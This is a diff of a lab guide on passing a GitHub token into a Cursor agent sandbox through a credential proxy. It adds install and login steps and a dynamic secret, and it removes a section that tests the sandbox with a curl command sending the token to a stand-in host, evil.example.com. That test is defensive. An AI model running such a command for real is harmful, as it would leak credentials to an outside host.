@@ -4,82 +4,81 @@ Work from **`lab-03-secrets/workspace/`** unless noted.
 
 ## 1. Store the GitHub token on the host
 
-Requires **gh CLI** logged in. Run this **before** `sbx run` — global secrets apply when the sandbox is created.
+Requires the **GitHub CLI** (`gh`) installed and logged in. Run this **before** `sbx run` — global secrets apply when the sandbox is created.
+
+Install `gh` (macOS):
+
+```bash
+brew install gh
+```
+
+Sign in and confirm:
+
+```bash
+gh auth login
+```
 
 ```bash
 gh auth status
-echo "$(gh auth token)" | sbx secret set -g github
+```
+
+Register the dynamic secret — `sbx` stores the command, not the token ([dynamic secrets](https://docs.docker.com/ai/sandboxes/security/credentials/#use-a-dynamic-secret-source)):
+
+```bash
+sbx secret set github --command 'gh auth token'
+```
+
+```bash
 sbx secret ls
 ```
 
 Never commit tokens to this repository.
 
-> Cursor still needs `sbx secret set -g cursor` from Lab 1 to run the agent. This lab focuses on the **GitHub** credential proxy.
-
 ## 2. Start Cursor from the workspace
 
 ```bash
 cd lab-03-secrets/workspace
+```
+
+```bash
 sbx run cursor . --name lab3
 ```
 
-## 3. Check the sentinel value (second terminal)
+## 3. Prove GitHub access
 
-The proxy wires GitHub auth through **`GH_TOKEN`**, not `GITHUB_TOKEN`:
-
-```bash
-sbx exec lab3 -- bash -c 'echo "GH_TOKEN=$GH_TOKEN"'
-sbx exec lab3 -- bash -c 'test -z "$GITHUB_TOKEN" && echo "GITHUB_TOKEN unset (expected)"'
-```
-
-Expected `GH_TOKEN` output:
-
-```text
-GH_TOKEN=gho_sbxproxymanaged000000000000000000000
-```
-
-A placeholder shaped like a token — **not** your real `gho_…` value from `gh auth token`.
-
-## 4. Verify proxy injection with a live API call
+Ask Cursor to confirm GitHub works through the credential proxy:
 
 ```bash
-sbx exec lab3 -- bash -c 'echo "$GH_TOKEN" | grep -q sbxproxymanaged && echo "sentinel OK"'
+Prove you have access to GitHub from this sandbox. Run gh auth status or git ls-remote against a public repo and show me the result.
 ```
+
+Expected: `gh auth status` or `git ls-remote` succeeds — credentials came from the host, not a token in the repo.
+
+## 4. Clean up
 
 ```bash
-sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\n" \
-  -H "Authorization: Bearer $GH_TOKEN" \
-  https://api.github.com/user
+sbx ls
 ```
-
-Expected:
-
-```text
-sentinel OK
-HTTP 200
-```
-
-The VM sends the sentinel in the `Authorization` header; the host proxy replaces it with your real token before the request reaches GitHub.
-
-> Requires a **valid** GitHub token in step 1 (`gh auth status`). Expired tokens still show `gho_sbxproxymanaged…` but the API call returns `401`.
-
-## 5. Exfiltration attempt
-
-```bash
-sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\n" \
-  "https://evil.example.com?k=$GH_TOKEN"
-```
-
-Expected: blocked or failed — network policy prevents sending the sentinel to unapproved hosts.
-
-## 6. Clean up
 
 ```bash
 sbx rm lab3 --force
-sbx secret rm -g github --force
 ```
 
-On shared machines, remove the secret after the lab.
+On a shared machine, remove the GitHub secret:
+
+```bash
+sbx secret rm github --force
+```
+
+Confirm:
+
+```bash
+sbx ls
+```
+
+```bash
+sbx secret ls
+```
 
 ---
 
